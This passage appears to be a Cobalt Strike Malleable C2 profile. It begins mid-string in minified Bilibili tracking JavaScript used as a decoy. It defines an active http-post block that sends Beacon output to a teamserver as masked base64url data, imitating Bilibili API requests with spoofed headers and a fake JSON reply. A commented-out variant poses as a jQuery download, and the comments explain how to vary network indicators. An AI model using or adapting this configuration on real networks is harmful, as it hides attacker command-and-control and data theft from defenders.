this.extMsgs[c]?s[c]=this.extMsgs[c]():s[c]=this.extMsgs[c];a.msg=JSON.stringify(s),r&&(a.refer_url=r),n&&(a.msg=n),a._uuid=this._uuid,a.url=encodeURIComponent(o||window.location.href).substr(0,1e3),a.is_selfdef=i;var l={type:\"pv\",obj:a};t.Z.receiveMsg(l,!0)}}]),o}(),p=o(8185),h=function(){function i(e){(0,r.Z)(this,i);this.cache=t.Z.cache,this.init(e)}return(0,n.Z)(i,[{key:\"init\",value:function(e){var r=e.sample;Math.random()>r||(this.initBsource(),this.initTracker(e),window.addEventListener(\"beforeunload\",(function(e){window&&t.Z.sendUnloadEvent()})))}},{key:\"initBsource\",value:function(){var t=p.Z.identify(),r=p.Z.uaSource();t&&(window.bsource=t,e.Z.setCookie(\"bsource\",window.bsource,0,\".bilibili.com\")),window.uaSource=r}},{key:\"importTracker\",value:function(e,t){var r=this;switch(e){case\"load\":o.e(950).then(function(e){var n=o(7950).Z;r.loadTracker=new n(t)}.bind(null,o)).catch(o.oe);break;case\"scroll\":o.e(512).then(function(e){var n=o(8512).Z;r.scrollTracker=new n(t),\"function\"==typeof window.onScrollTrackerLoaded&&window.onScrollTrackerLoaded()}.bind(null,o)).catch(o.oe);break;case\"error\":o.e(86).then(function(e){var n=o(4086).Z;r.errorTracker=new n(t)}.bind(null,o)).catch(o.oe);break;case\"misaka\":o.e(770).then(function(e){var n=o(2770).Z;r.misakaTracker=new n(t)}.bind(null,o)).catch(o.oe);break;case\"h5\":o.e(14).then(function(e){var n=o(14).Z;r.h5Tracker=new n(t)}.bind(null,o)).catch(o.oe);break;case\"abtest\":o.e(220).then(function(e){var n=o(4220).Z;r.abtestTracker=new n(t)}.bind(null,o)).catch(o.oe);break;case\"cdn\":o.e(507).then(function(e){var n=o(7507).Z;r.cdnTracker=new n(t)}.bind(null,o)).catch(o.oe)}}},{key:\"initTracker\",value:function(e){this.pvTracker=new d(e),this.eventTracker=new c(e);var r=/spider|bot/i.test(navigator.userAgent);e.cancelLoadTracker||r||this.importTracker(\"load\",e),e.scrollTracker&&this.importTracker(\"scroll\",e),e.errorTracker&&this.importTracker(\"error\",e),e.misakaTracker&&!r&&this.importTracker(\"misaka\",e),e.supportH5&&this.importTracker(\"h5\",e),e.hasAbtest&&this.importTracker(\"abtest\",e),e.searchPage&&t.Z.setSearchPage()}},{key:\"updateConfig\",value:function(){t.Z.updateConfig()}},{key:\"setSPM_id\",value:function(e){t.Z.setSPM_id(e)}},{key:\"reportWithSpmPrefix\",value:function(e,r,n){t.Z.reportWithSpmPrefix(e,r,n)}},{key:\"sendPV\",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:\"\",t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:\"\",r=arguments.length>2&&void 0!==arguments[2]?arguments[2]:\"\";this.pvTracker.sendPV({refer:e,msg:t,url:r,is_selfdef:1})}},{key:\"sendPerformance\",value:function(){this.loadTracker&&this.loadTracker.showRawPerformance()}},{key:\"reportCustomData\",value:function(e,r){t.Z.reportCustomData(e,r)}},{key:\"forceCommit\",value:function(){t.Z.checkRequests()}},{key:\"reportWithAdditionalParam\",value:function(){}},{key:\"setSpeicalMsg\",value:function(){}}]),i}(),v=function(){function e(t){(0,r.Z)(this,e),this.pvTracker=new d(t)}return(0,n.Z)(e,[{key:\"sendPV\",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:\"\",t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:\"\";this.pvTracker.sendPV({refer:e,msg:t})}},{key:\"reportWithSpmPrefix\",value:function(e,r,n){t.Z.reportWithSpmPrefix(e,r,n)}},{key:\"reportCustomData\",value:function(e,r){t.Z.reportCustomData(e,r)}},{key:\"updateConfig\",value:function(){}},{key:\"setSPM_id\",value:function(){}},{key:\"reportWithAdditionalParam\",value:function(){}},{key:\"forceCommit\",value:function(){}},{key:\"setSpeicalMsg\",value:function(){}}]),e}();o(4187),o(2320);!function(){var r=e.Z.getSpmPrefix();if(!window.reportObserver)if(window.reportConfig&&r){var n=window.reportConfig.msgObjects;n&&window[n]&&t.Z.setMsgObject(window[n]);var o=new h(window.reportConfig);window.reportObserver=o}else{var i=new v(window.reportConfig);window.reportObserver=i}}()})(),window.webpackLogReporter=i})();";
            print;
        }
    }
}

################################################
## HTTP POST
################################################
## Description:
##    POST is used to send output to the teamserver
##    Can use HTTP GET or POST to send data
##    Note on using GET: Beacon will automatically chunk its responses (and use multiple requests) to fit the constraints of an HTTP GET-only channel.
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Decide if you want to use HTTP GET or HTTP POST requests for this section
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
## Use HTTP POST for http-post section
## Uncomment this Section to activate
http-post {

    set uri "/x/internal/gaia-gateway/ExClimbWuzhi";
    set verb "POST";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        #header "Host" "code.jquery.com";
        header "Referer" "https://www.bilibili.com/";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36";
        header "Accept-Encoding" "gzip, deflate";
        #Accept-Language: zh-CN,zh;q=0.9 Origin: https://www.bilibili.com
        #User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
        header "Accept-Language" "zh-CN,zh;q=0.9";
       
        id {
            mask;       
            base64url;
            parameter "uid";            
        }
              
        output {
            mask;
            base64url;
            prepend "date=";
            print;
        }
    }

    server {

        header "Server" "Tengine";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";

        output {
            mask;
            base64url;
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 1st Line
            prepend "{\"code\":0,\"message\":\"0\",\"ttl\":1,\"data\":{";
            append "}}";
            print;
        }
    }
}

## GET only beacon
## Use HTTP GET for http-post section
## Uncomment this Section to activate an GET only beacon
# http-post {

#     set uri "/jquery-3.3.2.min.js";
#     set verb "GET";

#     client {

#         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
#         #header "Host" "code.jquery.com";
#         header "Referer" "http://code.jquery.com/";
#         header "Accept-Encoding" "gzip, deflate";
       
#         id {
#             mask;       
#             base64url;
#             parameter "__cfduid";            
#         }
              
#         output {
#             mask;
#             base64url;
# 			  parameter "__tg";
#         }
#     }

#     server {

#         header "Server" "NetDNA-cache/2.2";
#         header "Cache-Control" "max-age=0, no-cache";
#         header "Pragma" "no-cache";
#         header "Connection" "keep-alive";
#         header "Content-Type" "application/javascript; charset=utf-8";

#         output {
#             mask;
#             base64url;
#             ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
#             # 2nd Line            
#             prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
#             # 1st Line
#             prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
#             append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
#             print;
#         }
#     }
# }

## CS 4.0 Profile Variants
## Variants are selectable when configuring an HTTP or HTTPS Beacon listener. Variants allow each HTTP or HTTPS Beacon listener tied to a single team server to have network IOCs that differ from each other.
## You may add profile "variants" by specifying additional http-get, http-post, http-stager, and https-certifcate blocks with the following syntax:
## [block name] "variant name" { ... }. Here's a variant http-get block named "My Variant":
## http-get "My Variant" {
##	client {
##		parameter "bar" "blah";
 
